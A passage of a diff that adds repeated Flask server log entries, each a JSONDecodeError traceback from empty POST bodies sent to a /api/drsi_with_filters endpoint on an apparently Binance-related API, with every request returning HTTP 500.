+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:11] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004353
+(22236) accepted ('34.212.75.30', 38104)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:11] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004728
+(22236) accepted ('34.212.75.30', 38108)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:11] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004878
+(22236) accepted ('52.32.178.7', 54600)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.005303
+(22236) accepted ('34.212.75.30', 38252)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004807
+(22236) accepted ('52.32.178.7', 54606)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004791
+(22236) accepted ('52.32.178.7', 54648)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003874
+(22236) accepted ('52.32.178.7', 54654)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004086
+(22236) accepted ('34.212.75.30', 38308)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.007971
+(22236) accepted ('52.32.178.7', 54846)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:14] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004952
+(22236) accepted ('52.32.178.7', 54848)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:14] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.005660
+(22236) accepted ('34.212.75.30', 38494)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:14] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003803
+(22236) accepted ('52.32.178.7', 55152)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:16] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.008718
+(22236) accepted ('52.32.178.7', 55154)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:16] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.015893
+(22236) accepted ('34.212.75.30', 38808)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:16] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003832
+(22236) accepted ('52.32.178.7', 55228)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
